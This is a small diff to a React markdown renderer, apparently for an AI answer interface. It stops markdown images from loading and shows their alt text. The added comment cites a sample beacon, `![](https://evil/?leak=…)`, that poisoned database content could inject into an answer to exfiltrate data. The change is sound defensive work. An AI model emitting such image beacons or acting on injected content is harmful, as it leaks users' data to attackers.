@@ -10,6 +10,11 @@ import { exportRows } from '../api'
 const MD_COMPONENTS = {
   a: ({ node, ...props }) => <a target="_blank" rel="noopener noreferrer" {...props} />,
   table: ({ node, ...props }) => <div className="table-wrap"><table {...props} /></div>,
+  // Do NOT auto-load markdown images. Answers are text/tables (real visuals go
+  // through the sandboxed widget path), so a `![](https://evil/?leak=…)` that a
+  // poisoned DB value slipped into the answer would just be an exfil beacon.
+  // Render the alt text instead of fetching the src.
+  img: ({ node, alt }) => (alt ? <em>{alt}</em> : null),
 }
 
 /*
